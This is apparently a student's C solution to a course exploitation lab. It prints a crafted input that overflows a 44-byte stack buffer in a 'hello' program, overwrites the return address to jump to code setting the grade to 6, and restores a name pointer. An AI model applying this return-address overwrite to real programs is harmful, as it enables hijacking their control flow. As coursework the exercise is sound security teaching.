/*
  Name: Manos Chatzakis
  AM  : 4238
  Mail: csd4238@csd.uoc.gr
  File: createdata6.c

  This file makes hello programm to print grade 6.
*/

/*
  Some info:
  New address should be the address right after if statement.
  Address in hexadecimal is: 0x8048b68 (movl '6',grade => 0x08 0x04 0x8B 0x68)
  Analyzing the memory: Name = 0xe0 0x65 0x0d 0x08
*/

#include <stdio.h>

int main(void){

  int i;

  /*Writing to 44 bytes of buffer and 4 bytes of c variable*/
  printf("Manolis");
  for(i=0; i<41; i++){
    putchar('\0');
  }

  /*In this point i indexing variable is reached.
    So we jump to address 56 to overwrite the address

  0 |buf[0] |
  . |..     |
  43|buf[43]|
  44|c      |
  48|i      |
  52|ebp    |
  56|return |
  60|s      |
  */

  putchar(0x38); /*0x38 == 56*/

  /*Changing the return address*/
  putchar(0x68);
  putchar(0x8B);
  putchar(0x04);
  putchar(0x08);

  /*Now that new address is set,
    we need to set the name address again*/
  putchar(0xe0);
  putchar(0x65);
  putchar(0x0d);
  putchar(0x08);

  return 0;
}
